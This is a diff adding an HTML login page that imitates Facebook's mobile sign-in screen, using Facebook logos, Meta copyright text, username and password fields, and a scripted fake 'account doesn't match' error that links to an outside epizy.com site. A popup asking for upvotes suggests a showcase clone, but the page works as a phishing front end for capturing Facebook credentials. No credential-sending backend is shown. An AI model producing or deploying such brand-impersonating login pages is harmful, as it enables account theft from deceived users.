@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Welcome, login with facebook account." />
+  <meta name="theme-color" content="#1876f3" />
+  <title>Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<!-- Qasim -->
+<body>
+  <form class="form" name="form" action="" method="POST" onsubmit="return valid()">
+    <div class="ad">
+      <img src="https://dl.dropbox.com/s/romkyb4vq4k980b/f.png?dl=0" alt="" />
+      <p>
+        Get Facebook for Android and browser faster.
+      </p>
+    </div>
+    <img class="logo" src="https://dl.dropbox.com/s/2jpib59bvod6qjw/fb-logo.svg?dl=0" />
+    <input type="text" id="user" name="username" placeholder="Mobile number or email" />
+    <div class="input">
+      <input type="password" name="password" id="pass" placeholder="Password" />
+      <span>Show</span>
+    </div>
+    <button type="submit" name="submit">Log In</button>
+    <br />
+    <a href="#" class="fo">Forgot Password?</a>
+    <p class="or">
+      or
+    </p>
+    <a href="#" class="c">Create New Account</a>
+    <div class="lang">
+      <div class="box">
+        <a href="#"><b style="color:#adadad">English (UK)</b></a>
+        <a href="#">اردو</a>
+        <a href="#">বাংলা</a>
+        <a href="#">मराठी</a>
+      </div>
+      <div class="box">
+        <a href="#"> हिन्दी</a>
+        <a href="#">ਪੰਜਾਬੀ</a>
+        <a href="#">ગુજરાતી</a>
+        <a href="#" class="p">+</a>
+      </div>
+    </div>
+    <p class="lnc">
+      About.Help.More
+    </p>
+    <p class="lnc">
+      Meta © 2023
+    </p>
+  </form>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
+  <script type="text/javascript">
+  Swal.fire({
+      icon: 'success',
+      title: 'Welcome dear',
+      text: 'If you like it, please upvote and comment'
+  })
+    function valid() {
+      var username = document.forms["form"]["username"].value;
+      var password = document.forms["form"]["password"].value;
+      if (username == "" || password == "") {
+        $(".ad").html("The email or phone number you've entered doesn't match any account. <b><a href='http://tech-af.epizy.com/facebook'>Sing up for an account.</a></b>").css({
+          "display": "block", "background": "#e92626", "color": "#fff", "font-size": "14px", "text-align": "left"
+        });
+        $("#user").css("border-color", "red");
+        return false;
+      } else {
+        return true;
+      }
+    }
+    // showing eye button
+    $("#pass").on("keyup", ()=> {
+      if ($("#pass").val() !== null) {
+        $("span").css("display", "block");
+      } else {
+        $("span").css("display", "none");
+      }
+    })
+    var pass = document.getElementById("pass");
+    $("span").click(()=> {
+      if (pass.type == "password") {
+        pass.type = "text";
+        $("span").html("Hide");
+      } else {
+        pass.type = "password";
+        $("span").html("Show")
+      }
+    })
+  </script>
+</body>
+</html>
